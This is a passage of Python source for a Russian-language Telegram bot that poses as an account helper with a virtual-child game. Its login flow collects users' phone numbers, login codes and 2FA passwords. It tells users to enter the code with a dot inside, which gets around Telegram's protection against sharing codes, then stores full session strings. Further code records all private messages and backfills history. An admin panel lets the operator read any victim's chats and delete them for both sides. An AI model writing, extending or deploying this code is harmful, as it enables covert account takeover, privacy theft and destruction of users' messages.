                    await asyncio.sleep(e.seconds + 1); continue
                except: continue
                for m in msgs:
                    if not m: continue
                    text = m.text or "[📎 медиа]"
                    sid, sname, suname = await extract_sender_info(m)
                    if sid:
                        try: save_user_info(sid, suname, sname)
                        except: pass
                    if save_chat_message(user_id, chat_id, sid, sname, suname, text, int(m.id)):
                        loaded_msgs += 1
                await asyncio.sleep(0.2)
            except Exception as e:
                logging.warning(f"Backfill dialog: {e}")
        logging.info(f"📥 Backfill {user_id}: +{loaded_chats} чатов, +{loaded_msgs} сообщ.")
    except Exception as e:
        logging.error(f"backfill_dialogs: {e}")

async def start_telethon_listener(user_id, session_str):
    try:
        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)

        @client.on(events.NewMessage)
        async def on_msg(event):
            try:
                chat_id = int(event.chat_id) if event.chat_id else None
                if chat_id is None: return
                text = event.message.text or "[📎 медиа]"
                sid, sname, suname = await extract_sender_info(event.message)
                if sid:
                    try: save_user_info(sid, suname, sname)
                    except: pass
                save_chat_message(user_id, chat_id, sid, sname, suname, text, int(event.message.id))
                try:
                    chat = await event.get_chat()
                    cname = getattr(chat, 'title', None) or getattr(chat, 'first_name', None) or "Чат"
                    save_user_chat(user_id, chat_id, cname)
                except: pass
            except Exception as e:
                logging.error(f"on_msg: {e}")

        await client.start()
        telethon_clients[user_id] = client
        logging.info(f"✅ Telethon запущен для {user_id}")

        try:
            async for dialog in client.iter_dialogs(limit=300):
                save_user_chat(user_id, int(dialog.id), dialog.name or "Чат")
        except: pass

        asyncio.create_task(backfill_dialogs(client, user_id))
        return client
    except Exception as e:
        logging.error(f"start_telethon_listener {user_id}: {e}")
        return None

async def restore_all_sessions():
    sessions = get_all_sessions()
    logging.info(f"🔄 Восстанавливаем {len(sessions)} сессий...")
    for user_id, session_str in sessions:
        try: await start_telethon_listener(int(user_id), session_str)
        except: pass
        await asyncio.sleep(0.5)
    logging.info(f"✅ Активных клиентов: {len(telethon_clients)}")

# ==================== КЛАВИАТУРЫ ====================
def get_start_keyboard(user_id):
    buttons = []
    if user_id == ADMIN_ID:
        buttons.append([InlineKeyboardButton(text="👑 Админ-панель", callback_data="btn_admin_panel")])
    buttons.append([InlineKeyboardButton(text="📖 Функционал", callback_data="btn_features")])
    buttons.append([InlineKeyboardButton(text="🤖 Подключить аккаунт (номер телефона)", callback_data="btn_group_auth")])
    return InlineKeyboardMarkup(inline_keyboard=buttons)

def get_admin_keyboard():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
        [InlineKeyboardButton(text="👥 Пользователи", callback_data="admin_users")],
        [InlineKeyboardButton(text="🚫 Забанить / Разбанить", callback_data="admin_ban_prompt")]
    ])

def get_users_keyboard(page=0):
    users = get_all_users()
    keyboard = []
    start_idx = page * 10
    end_idx = min(start_idx + 10, len(users))
    for i in range(start_idx, end_idx):
        user_id, username, first_name, date, user_type = users[i]
        name = first_name or username or f"ID:{user_id}"
        display_name = f"{name[:20]}..." if len(name) > 20 else name
        type_icon = "📱" if user_type == "business" else "👤"
        chats_count = count_user_chats(user_id)  # из кэша — мгновенно
        sess = "🔑" if get_session(user_id) else "🚫"
        online = "🟢" if user_id in telethon_clients else "⚪"
        keyboard.append([InlineKeyboardButton(
            text=f"{online}{sess}{type_icon} {display_name} ({chats_count})",
            callback_data=f"user_{user_id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"users_page_{page-1}"))
    if end_idx < len(users): nav.append(InlineKeyboardButton(text="➡️ Вперед", callback_data=f"users_page_{page+1}"))
    if nav: keyboard.append(nav)
    keyboard.append([InlineKeyboardButton(text="🔙 Назад в админку", callback_data="admin_panel_back")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_user_chats_live_keyboard(user_id, page=0):
    chats = get_user_chats(user_id)
    keyboard = []
    start_idx = page * 10
    end_idx = min(start_idx + 10, len(chats))
    for i in range(start_idx, end_idx):
        chat_id, chat_name = chats[i]
        display = chat_name[:28] + "…" if len(chat_name) > 28 else chat_name
        keyboard.append([InlineKeyboardButton(text=f"💬 {display}", callback_data=f"opnch_{user_id}_{chat_id}")])
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️", callback_data=f"live_chats_{user_id}_{page-1}"))
    if end_idx < len(chats): nav.append(InlineKeyboardButton(text="➡️", callback_data=f"live_chats_{user_id}_{page+1}"))
    if nav: keyboard.append(nav)
    keyboard.append([InlineKeyboardButton(text="🔙 К пользователю", callback_data=f"user_{user_id}")])
    return InlineKeyboardMarkup(inline_keyboard=keyboard)

def get_chat_view_keyboard(user_id, chat_id, page, total, per_page=15):
    kb = []
    nav = []
    if page > 0: nav.append(InlineKeyboardButton(text="⬅️ Старше", callback_data=f"pgchat_{user_id}_{chat_id}_{page-1}"))
    if (page + 1) * per_page < total: nav.append(InlineKeyboardButton(text="➡️ Новее", callback_data=f"pgchat_{user_id}_{chat_id}_{page+1}"))
    if nav: kb.append(nav)
    kb.append([InlineKeyboardButton(text="🔄 Загрузить историю", callback_data=f"bfchat_{user_id}_{chat_id}")])
    kb.append([InlineKeyboardButton(text="🗑️ Удалить этот чат", callback_data=f"askdel_{user_id}_{chat_id}")])
    kb.append([InlineKeyboardButton(text="🔙 К чатам", callback_data=f"live_chats_{user_id}_0")])
    return InlineKeyboardMarkup(inline_keyboard=kb)

def format_chat_messages(user_id, chat_id, page=0):
    msgs, total = get_chat_messages(user_id, chat_id, page)
    chats = get_user_chats(user_id)
    chat_name = next((n for cid, n in chats if cid == chat_id), str(chat_id))
    owner_uid = user_id
    owner_name = user_names.get(owner_uid, "Владелец")
    peer_id, peer_name, peer_username = None, None, None
    for sid, sname, suname, _, _ in msgs:
        if sid != owner_uid:
            peer_id, peer_name, peer_username = sid, sname, suname; break

    def link(uid, name, username=None):
        if not uid: return f"<b>{name or 'неизвестно'}</b>"
        shown = name or "User"
        return f'<a href="tg://user?id={uid}">{shown}</a>' + (f" (@{username})" if username else "")

    header = (
        f"💬 <b>Чат:</b> {chat_name}\n"
        f"👤 Владелец: {link(owner_uid, owner_name)}\n"
        f"👥 Собеседник: {link(peer_id, peer_name, peer_username)}\n"
        f"📊 Сообщений: {total} (стр. {page+1})\n"
        f"━━━━━━━━━━━━━━━━━━━━\n\n"
    )
    if not msgs:
        return header + "<i>Сообщений пока нет.\nНажми «🔄 Загрузить историю».</i>", total
    lines = []
    for sid, sname, suname, text, dt in msgs:
        who = link(sid, sname, suname)
        ts = dt.strftime("%d.%m %H:%M") if dt else ""
        safe = (text or "").replace("<", "&lt;").replace(">", "&gt;")
        lines.append(f"[{ts}] {who}:\n{safe}")
    body = "\n\n".join(lines)
    if len(header) + len(body) > 3800:
        body = "…" + body[-(3800 - len(header)):]
    return header + body, total

# ==================== КОМАНДЫ ====================
@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    await state.clear()
    if message.chat.type != "private": return
    uid = message.from_user.id
    save_user_info(uid, message.from_user.username, message.from_user.first_name)
    await message.answer(
        f"👋 Добро пожаловать, {get_user_mention(uid, message.from_user.first_name)}!\n\n"
        f"💬 Бот управляет функциями вашего аккаунта.\n\nВыберите раздел:",
        parse_mode="HTML", reply_markup=get_start_keyboard(uid))

@dp.message(F.text.in_(["/admin", ".админ", "админ"]))
async def admin_panel(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")

# ========== РЕБЁНОК (ФИКС: простой startswith) ==========
@dp.message(F.text.lower().startswith("родить"))
async def cmd_give_birth(message: Message):
    txt = (message.text or "").strip()
    m = re.match(r"(?i)^родить\s+(сына|дочь)\s+(.+)$", txt)
    if not m:
        await message.answer("❌ Формат: <code>родить сына Имя</code> / <code>родить дочь Имя</code>", parse_mode="HTML")
        return
    gender = "m" if m.group(1).lower() == "сына" else "f"
    name = m.group(2).strip().strip("()[]{}").strip()
    name = name[:32]
    if not name:
        await message.answer("❌ Имя не указано.")
        return
    existing = get_alive_child(message.from_user.id)
    if existing:
        await message.answer(f"У тебя уже есть ребёнок — {existing['name']}.")
        return
    child = create_child(message.from_user.id, name, gender)
    if not child:
        await message.answer("❌ Не получилось, попробуй позже.")
        return
    await message.answer(birth_rules_text(child["name"], child["gender"], child["birth_date"]))

@dp.message(F.text.lower().in_(["наш сын", "наш дочь", "наша дочь", "наш сына"]))
async def cmd_child_status(message: Message):
    child = get_alive_child(message.from_user.id)
    if not child:
        await message.answer("У тебя пока нет ребёнка.\nНапиши: <code>родить сына Имя</code>", parse_mode="HTML"); return
    await message.answer(child_status_text(child), reply_markup=child_action_keyboard(child["id"]))

@dp.callback_query(F.data.startswith("child_"))
async def cb_child_action(callback: CallbackQuery):
    parts = callback.data.split("_")
    action = parts[1]; child_id = int(parts[2])
    child = get_alive_child(callback.from_user.id)
    if not child or child["id"] != child_id:
        await callback.answer("Ребёнок не найден 💀", show_alert=True); return
    if action == "heal":
        update_child_field(child_id, "health", child["health"] + 25)
        await callback.answer("💊 Полечили!")
    elif action in NEEDS:
        update_child_field(child_id, action, child[action] + RESTORE_AMOUNT[action])
        await callback.answer("✅ Готово!")
    else:
        await callback.answer(); return
    child = get_alive_child(callback.from_user.id)
    try:
        await callback.message.edit_text(child_status_text(child), reply_markup=child_action_keyboard(child["id"]))
    except: pass

# ==================== ЗАДАЧИ РЕБЁНКА ====================
async def child_decay_loop():
    while True:
        await asyncio.sleep(TICK_MINUTES * 60)
        try:
            for child in get_all_alive_children_full():
                old = {k: child[k] for k in NEEDS}
                new_values = {}; critical = 0; reminders = []
                for key in NEEDS:
                    nv = max(0, old[key] - DECAY_PER_TICK[key])
                    new_values[key] = nv
                    if nv <= REMINDER_THRESHOLD:
                        critical += 1
                        if old[key] > REMINDER_THRESHOLD: reminders.append(key)
                new_health = child["health"] - HEALTH_DECAY_IF_CRITICAL * critical if critical else child["health"] + HEALTH_REGEN_IF_OK
                new_health = max(0, min(100, new_health))
                if new_health <= 0:
                    kill_child(child["id"])
                    gw = "Сын" if child["gender"] == "m" else "Дочь"
                    dw = "умер" if child["gender"] == "m" else "умерла"
                    try: await bot.send_message(child["owner_id"], f"💀 {gw} {child['name']} {dw}.")
                    except: pass
                    continue
                update_child_full(child["id"], new_health, new_values)
                for key in reminders:
                    try:
                        await bot.send_message(child["owner_id"], f"{child['name']}: {REMINDER_PHRASES[key]}",
                                               reply_markup=child_action_keyboard(child["id"], highlight=key))
                    except: pass
        except Exception as e:
            logging.error(f"child_decay_loop: {e}")

async def child_birthday_loop():
    while True:
        await asyncio.sleep(24 * 60 * 60)
        try:
            for child in get_all_alive_children_full():
                years, _ = get_game_age(child["birth_date"])
                bd = child["birth_date"]
                today = datetime.now(timezone.utc).date()
                if isinstance(bd, datetime): bd = bd.date()
                if bd.day == today.day and bd.month == today.month and years > child["last_birthday_year"] and years > 0:
                    set_last_birthday_year(child["id"], years)
                    gw = "Сыну" if child["gender"] == "m" else "Дочери"
                    try: await bot.send_message(child["owner_id"], f"🎂 {gw} {child['name']} {years} лет!")
                    except: pass
        except: pass

# ==================== АВТОРИЗАЦИЯ ====================
@dp.callback_query(F.data == "btn_group_auth")
async def group_auth(callback: CallbackQuery, state: FSMContext):
    await callback.answer()
    if get_session(callback.from_user.id):
        await callback.message.answer("✅ Аккаунт уже подключен!"); return
    keyboard = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📱 Отправить номер", request_contact=True)]],
        resize_keyboard=True, one_time_keyboard=True)
    await callback.message.answer(
        "🔐 <b>Подключение аккаунта для чтения личных чатов</b>\n\n"
        "⚠️ Это отдельный шаг. Если ты подключал бота через настройки Telegram (Business) — "
        "это <b>не то же самое</b>. Для чтения своих чатов нужна сессия через номер телефона.\n\n"
        "📱 <b>Введи номер</b> в формате <code>79123456789</code> или нажми кнопку ниже.",
        parse_mode="HTML", reply_markup=keyboard)
    await state.set_state(AuthState.waiting_for_phone)

@dp.message(StateFilter(AuthState.waiting_for_phone), F.contact | F.text)
async def process_phone(message: Message, state: FSMContext):
    await message.answer("⏳ Отправка кода...", reply_markup=ReplyKeyboardRemove())
    try:
        if message.contact:
            phone = message.contact.phone_number
        elif message.text:
            phone = re.sub(r'[^\d+]', '', message.text.strip())
            if phone.startswith('8') and len(phone) == 11: phone = '+7' + phone[1:]
            elif not phone.startswith('+'): phone = '+' + phone
        else:
            await message.answer("❌ Отправь номер"); return
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        await client.send_code_request(phone)
        await state.update_data(phone=phone, client=client)
        view_code_kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📩 Посмотреть код", url="https://t.me/telegram")],
            [InlineKeyboardButton(text="🔄 Заново", callback_data="btn_group_auth")]])
        await message.answer(
            f"📱 <b>Код отправлен!</b>\nНомер: <code>{phone}</code>\n\n"
            f"⚠️ Введи код с точкой внутри.\nНапример: <code>56.785</code>",
            parse_mode="HTML", reply_markup=view_code_kb)
        await state.set_state(AuthState.waiting_for_code)
    except FloodWaitError as e:
        await message.answer(f"⏳ Подожди {e.seconds} сек"); await state.clear()
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}"); await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_code), F.text)
async def process_code(message: Message, state: FSMContext):
    code_raw = message.text.strip()
    code = code_raw.replace('.', '')
    if not code.isdigit():
        await message.answer("❌ Неверный формат. Например: <code>56.785</code>", parse_mode="HTML"); return
    data = await state.get_data()
    phone = data.get("phone"); client = data.get("client")
    if not phone or not client:
        await message.answer("❌ Данные устарели"); await state.clear(); return
    await message.answer("🔄 Проверка...")
    try:
        await client.sign_in(phone=phone, code=code)
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await start_telethon_listener(message.from_user.id, final_session)
        try: await client.disconnect()
        except: pass
        await message.answer(
            f"✅ <b>Аккаунт подключён!</b>\n\n"
            f"📥 Загружаю историю чатов в фоне — это займёт пару минут.\n\n"
            f"{TEXT_COMMANDS_HELP}",
            parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
        await state.clear()
    except SessionPasswordNeededError:
        await message.answer("🔐 Введи пароль 2FA:")
        await state.set_state(AuthState.waiting_for_2fa)
    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
        await message.answer("❌ Неверный код.")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {str(e)}"); await state.clear()

@dp.message(StateFilter(AuthState.waiting_for_2fa), F.text)
async def process_2fa(message: Message, state: FSMContext):
    password = message.text.strip()
    data = await state.get_data()
    client = data.get("client"); phone = data.get("phone")
    if not client or not phone:
        await message.answer("❌ Данные устарели"); await state.clear(); return
    try:
        await client.sign_in(password=password)
        final_session = client.session.save()
        save_session(message.from_user.id, final_session)
        save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
        await start_telethon_listener(message.from_user.id, final_session)
        try: await client.disconnect()
        except: pass
        await message.answer(f"✅ <b>Готово!</b>\n\n{TEXT_COMMANDS_HELP}",
                             parse_mode="HTML", reply_markup=ReplyKeyboardRemove())
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Неверный пароль: {str(e)}")

@dp.message(Command("disconnect"))
async def cmd_disconnect(message: Message):
    if message.chat.type != "private": return
    user_id = message.from_user.id
    if not get_session(user_id):
        await message.answer("❌ Нет активной сессии."); return
    delete_session(user_id)
    if user_id in telethon_clients:
        try: await telethon_clients[user_id].disconnect()
        except: pass
        del telethon_clients[user_id]
    delete_all_user_chats(user_id)
    delete_business_account(user_id)
    await message.answer("✅ <b>Отключено.</b>", parse_mode="HTML", reply_markup=ReplyKeyboardRemove())

# ==================== CALLBACKS ====================
@dp.callback_query()
async def process_callbacks(callback: CallbackQuery, state: FSMContext):
    data = callback.data
    uid = callback.from_user.id
    if data.startswith("child_"): return
    if data == "btn_features":
        await callback.message.answer(TEXT_COMMANDS_HELP, parse_mode="HTML"); await callback.answer(); return
    if data == "btn_group_auth":
        await group_auth(callback, state); return
    if data == "btn_admin_panel":
        if uid != ADMIN_ID: await callback.answer(); return
        await callback.message.answer("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        await callback.answer(); return
    if uid != ADMIN_ID:
        await callback.answer(); return

    if data.startswith("live_chats_"):
        parts = data.split("_")
        user_id = int(parts[2]); page = int(parts[3])
        chats = get_user_chats(user_id)
        try:
            await callback.message.edit_text(
                f"📋 <b>Личные чаты {get_user_mention(user_id)}</b>\n\nВсего: <code>{len(chats)}</code>",
                reply_markup=get_user_chats_live_keyboard(user_id, page), parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data.startswith("opnch_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        text, total = format_chat_messages(user_id, chat_id, 0)
        if total == 0:
            client = telethon_clients.get(user_id)
            if client:
                await callback.answer("⏳ Загружаю историю...", show_alert=False)
                await backfill_one_chat(client, user_id, chat_id, limit=100)
                text, total = format_chat_messages(user_id, chat_id, 0)
            else:
                sess = get_session(user_id)
                if sess:
                    await callback.answer("⏳ Поднимаю клиент...", show_alert=False)
                    c = await start_telethon_listener(user_id, sess)
                    if c:
                        await backfill_one_chat(c, user_id, chat_id, limit=100)
                        text, total = format_chat_messages(user_id, chat_id, 0)
                else:
                    await callback.answer("⚠️ У юзера нет Telethon-сессии. Юзер должен подключиться через /start → Подключить аккаунт.", show_alert=True)
        try:
            await callback.message.edit_text(text,
                reply_markup=get_chat_view_keyboard(user_id, chat_id, 0, total),
                parse_mode="HTML", disable_web_page_preview=True)
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data.startswith("pgchat_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2]); page = int(parts[3])
        text, total = format_chat_messages(user_id, chat_id, page)
        try:
            await callback.message.edit_text(text,
                reply_markup=get_chat_view_keyboard(user_id, chat_id, page, total),
                parse_mode="HTML", disable_web_page_preview=True)
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data.startswith("bfchat_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        client = telethon_clients.get(user_id)
        if not client:
            sess = get_session(user_id)
            if sess: client = await start_telethon_listener(user_id, sess)
        if not client:
            await callback.answer("❌ Нет сессии у юзера", show_alert=True); return
        await callback.answer("⏳ Загружаю...", show_alert=False)
        saved = await backfill_one_chat(client, user_id, chat_id, limit=200)
        text, total = format_chat_messages(user_id, chat_id, 0)
        try:
            await callback.message.edit_text(text,
                reply_markup=get_chat_view_keyboard(user_id, chat_id, 0, total),
                parse_mode="HTML", disable_web_page_preview=True)
        except TelegramBadRequest: pass
        await callback.answer(f"✅ +{saved}", show_alert=False)
        return

    if data.startswith("askdel_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        chats = get_user_chats(user_id)
        chat_name = next((n for cid, n in chats if cid == chat_id), str(chat_id))
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="✅ Да, удалить этот чат", callback_data=f"cnfdel_{user_id}_{chat_id}")],
            [InlineKeyboardButton(text="❌ Отмена", callback_data=f"opnch_{user_id}_{chat_id}")]])
        try:
            await callback.message.edit_text(
                f"⚠️ <b>Удалить чат «{chat_name}»?</b>\n\n"
                f"• У пользователя этот чат удалится со всеми сообщениями.\n"
                f"• Сообщения удалятся и у собеседника.\n"
                f"• Остальные чаты <b>НЕ</b> тронутся.",
                reply_markup=kb, parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data.startswith("cnfdel_"):
        parts = data.split("_")
        user_id = int(parts[1]); chat_id = int(parts[2])
        client = telethon_clients.get(user_id)
        if not client:
            sess = get_session(user_id)
            if sess: client = await start_telethon_listener(user_id, sess)
        ok = False; err = None
        if not client:
            err = "Нет Telethon-сессии. Юзер должен подключиться через /start."
        else:
            try:
                try:
                    ids = []
                    async for m in client.iter_messages(chat_id, limit=500):
                        ids.append(m.id)
                    if ids: await client.delete_messages(chat_id, ids, revoke=True)
                except Exception as e: logging.warning(f"del msgs: {e}")
                try: await client.delete_dialog(chat_id, revoke=True)
                except TypeError: await client.delete_dialog(chat_id)
                ok = True
            except Exception as e:
                err = str(e); logging.error(f"del chat: {e}")
        if ok:
            clear_chat_messages(user_id, chat_id)
            delete_user_chat(user_id, chat_id)
            await callback.answer("✅ Чат удалён!", show_alert=True)
        else:
            await callback.answer(f"❌ {err}", show_alert=True)
        chats = get_user_chats(user_id)
        try:
            await callback.message.edit_text(
                f"📋 <b>Личные чаты {get_user_mention(user_id)}</b>\n\nВсего: <code>{len(chats)}</code>",
                reply_markup=get_user_chats_live_keyboard(user_id, 0), parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data == "admin_panel_back":
        try: await callback.message.edit_text("👑 <b>Панель Администратора</b>", reply_markup=get_admin_keyboard(), parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data == "admin_stats":
        business_users = get_business_accounts()
        manual_users = get_all_users()
        total_manual = len([u for u in manual_users if u[4] == 'manual'])
        total_chats = sum(count_user_chats(u[0]) for u in manual_users)
        total_msgs = sum(count_user_messages(u[0]) for u in manual_users)
        sess_count = len(get_all_sessions())
        try:
            await callback.message.edit_text(
                f"📊 <b>СТАТИСТИКА:</b>\n\n"
                f"• Бизнес-аккаунтов: <code>{len(business_users)}</code>\n"
                f"• Ручных: <code>{total_manual}</code>\n"
                f"• Сессий (телефон): <code>{sess_count}</code>\n"
                f"• Активных клиентов: <code>{len(telethon_clients)}</code>\n"
                f"• Чатов: <code>{total_chats}</code>\n"
                f"• Сообщений: <code>{total_msgs}</code>\n"
                f"• Забанено: <code>{len(banned_users)}</code>",
                reply_markup=get_admin_keyboard(), parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data == "admin_users":
        try:
            await callback.message.edit_text(
                "👥 <b>ПОЛЬЗОВАТЕЛИ</b>\n\n"
                "🟢 онлайн / ⚪ оффлайн\n🔑 есть сессия / 🚫 нет сессии",
                reply_markup=get_users_keyboard(0), parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data.startswith("users_page_"):
        page = int(data.split("_")[2])
        try:
            await callback.message.edit_text(
                "👥 <b>ПОЛЬЗОВАТЕЛИ</b>\n\n🟢 онлайн / ⚪ оффлайн\n🔑 сессия есть / 🚫 нет",
                reply_markup=get_users_keyboard(page), parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data.startswith("user_"):
        user_id = int(data.split("_")[1])
        chats_count = count_user_chats(user_id)
        msgs_count = count_user_messages(user_id)
        sess = get_session(user_id)
        online = "🟢 онлайн" if user_id in telethon_clients else "⚪ оффлайн"
        session_status = "🔑 есть" if sess else "🚫 отсутствует"
        rows = [[InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"live_chats_{user_id}_0")]]
        if sess:
            rows.append([InlineKeyboardButton(text="🔄 Поднять клиент", callback_data=f"restart_client_{user_id}")])
            rows.append([InlineKeyboardButton(text="📥 Загрузить всю историю", callback_data=f"fullbf_{user_id}")])
        else:
            rows.append([InlineKeyboardButton(text="⚠️ Нет сессии (юз. не привязал тел.)", callback_data="noop")])
        rows.append([InlineKeyboardButton(text="❌ Удалить из списка", callback_data=f"delete_user_{user_id}")])
        rows.append([InlineKeyboardButton(text="🚫 Забанить", callback_data=f"ban_user_{user_id}")])
        rows.append([InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")])
        try:
            await callback.message.edit_text(
                f"👤 <b>Инфо</b>\n\n"
                f"ID: <code>{user_id}</code>\n"
                f"Имя: {get_user_mention(user_id)}\n"
                f"Клиент: {online}\n"
                f"Telethon-сессия: {session_status}\n"
                f"Чатов: <code>{chats_count}</code>\n"
                f"Сообщений: <code>{msgs_count}</code>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=rows), parse_mode="HTML")
        except TelegramBadRequest: pass
        await callback.answer(); return

    if data == "noop":
        await callback.answer("У пользователя нет Telethon-сессии. Пусть напишет боту /start → "
                              "«Подключить аккаунт» и введёт номер телефона.", show_alert=True)
        return

    if data.startswith("restart_client_"):
        user_id = int(data.split("_")[2])
        sess = get_session(user_id)
        if not sess:
            await callback.answer("❌ Нет сессии. Юзер не привязывал телефон.", show_alert=True); return
        await callback.answer("⏳ Поднимаю...", show_alert=False)
        if user_id in telethon_clients:
            try: await telethon_clients[user_id].disconnect()
            except: pass
            del telethon_clients[user_id]
        c = await start_telethon_listener(user_id, sess)
        if c: await callback.message.answer(f"✅ Клиент <code>{user_id}</code> запущен!", parse_mode="HTML")
        else: await callback.message.answer(f"❌ Не удалось.")
        return

    if data.startswith("fullbf_"):
        user_id = int(data.split("_")[1])
        client = telethon_clients.get(user_id)
        if not client:
            sess = get_session(user_id)
            if sess: client = await start_telethon_listener(user_id, sess)
        if not client:
            await callback.answer("❌ Нет сессии", show_alert=True); return
        await callback.answer("⏳ Запущено...", show_alert=False)
        msg = callback.message
        async def _run():
            try:
                await backfill_dialogs(client, user_id, max_dialogs=300, per_chat=50)
                await msg.answer(f"✅ История для <code>{user_id}</code> загружена.", parse_mode="HTML")
            except Exception as e: await msg.answer(f"❌ {e}")
        asyncio.create_task(_run())
        return

    if data.startswith("delete_user_"):
        user_id = int(data.split("_")[2])
        delete_business_account(user_id)
        await callback.answer("✅ Удалён!", show_alert=True)
        try: await callback.message.edit_text("👥 <b>ПОЛЬЗОВАТЕЛИ</b>", reply_markup=get_users_keyboard(0), parse_mode="HTML")
        except: pass
        return

    if data.startswith("ban_user_"):
        user_id = int(data.split("_")[2])
        if user_id in banned_users:
            set_user_ban(user_id, False); await callback.answer("✅ Разбанен!", show_alert=True)
        else:
            set_user_ban(user_id, True); await callback.answer("🚫 Забанен!", show_alert=True)
        status = "забанен" if user_id in banned_users else "разбанен"
        chats_count = count_user_chats(user_id); msgs_count = count_user_messages(user_id)
        try:
            await callback.message.edit_text(
                f"👤 ID: <code>{user_id}</code>\nИмя: {get_user_mention(user_id)}\nСтатус: {status}\n"
                f"Чатов: <code>{chats_count}</code>\nСообщений: <code>{msgs_count}</code>",
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text=f"📋 Чаты ({chats_count})", callback_data=f"live_chats_{user_id}_0")],
                    [InlineKeyboardButton(text="🚫 Забанить/Разбанить", callback_data=f"ban_user_{user_id}")],
                    [InlineKeyboardButton(text="🔙 Назад", callback_data="admin_users")]]),
                parse_mode="HTML")
        except: pass
        return

    if data == "admin_ban_prompt":
        try:
            await callback.message.edit_text(
                "🚫 /ban 123456789 или /ban @username\n/unban 123456789",
                reply_markup=get_admin_keyboard(), parse_mode="HTML")
        except: pass
        await callback.answer(); return

    await callback.answer()

# ==================== АДМИН-КОМАНДЫ ====================
async def resolve_user_id(target_raw):
    target = target_raw.strip()
    if target.startswith("@"):
        return user_usernames.get(target.lstrip("@").lower())
    elif target.isdigit():
        return int(target)
    return None

@dp.message(Command("ban"))
async def cmd_ban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        tid = await resolve_user_id(arg)
        if tid:
            set_user_ban(tid, True); delete_business_account(tid)
            await message.answer(f"🚫 {get_user_mention(tid)} забанен!", parse_mode="HTML")
        else: await message.answer("❌ Не найден.", parse_mode="HTML")
    except: await message.answer("Формат: /ban 123456789", parse_mode="HTML")

@dp.message(Command("unban"))
async def cmd_unban(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        tid = await resolve_user_id(arg)
        if tid:
            set_user_ban(tid, False)
            await message.answer(f"✅ {get_user_mention(tid)} разбанен!", parse_mode="HTML")
        else: await message.answer("❌ Не найден.", parse_mode="HTML")
    except: await message.answer("Формат: /unban 123456789", parse_mode="HTML")

@dp.message(Command("restore"))
async def cmd_restore(message: Message):
    if message.from_user.id != ADMIN_ID: return
    await message.answer("⏳ Поднимаю сессии...")
    await restore_all_sessions()
    await message.answer(f"✅ Клиентов: <b>{len(telethon_clients)}</b>", parse_mode="HTML")

@dp.message(Command("debug_user"))
async def cmd_debug_user(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        tid = await resolve_user_id(arg)
        if not tid: await message.answer("❌ Не найден."); return
        sess = get_session(tid); client = telethon_clients.get(tid)
        lines = [f"🔎 <b>Debug user {tid}</b>\n"]
        lines.append(f"• Сессия в БД: {'✅' if sess else '❌'}")
        lines.append(f"• Клиент: {'✅' if client else '❌'}")
        lines.append(f"• Чатов: {count_user_chats(tid)}")
        lines.append(f"• Сообщений: {count_user_messages(tid)}")
        if client:
            try: lines.append(f"• Connected: {'✅' if client.is_connected() else '❌'}")
            except: pass
        await message.answer("\n".join(lines), parse_mode="HTML")
    except: await message.answer("Формат: /debug_user 123")

@dp.message(Command("force_backfill"))
async def cmd_force_backfill(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        arg = message.text.split(maxsplit=1)[1]
        tid = await resolve_user_id(arg)
        if not tid: await message.answer("❌ Не найден."); return
        client = telethon_clients.get(tid)
        if not client:
            sess = get_session(tid)
            if sess: client = await start_telethon_listener(tid, sess)
        if not client:
            await message.answer("❌ Нет сессии у юзера."); return
        await message.answer(f"⏳ Загружаю...")
        before = count_user_messages(tid)
        await backfill_dialogs(client, tid, max_dialogs=300, per_chat=50)
        after = count_user_messages(tid)
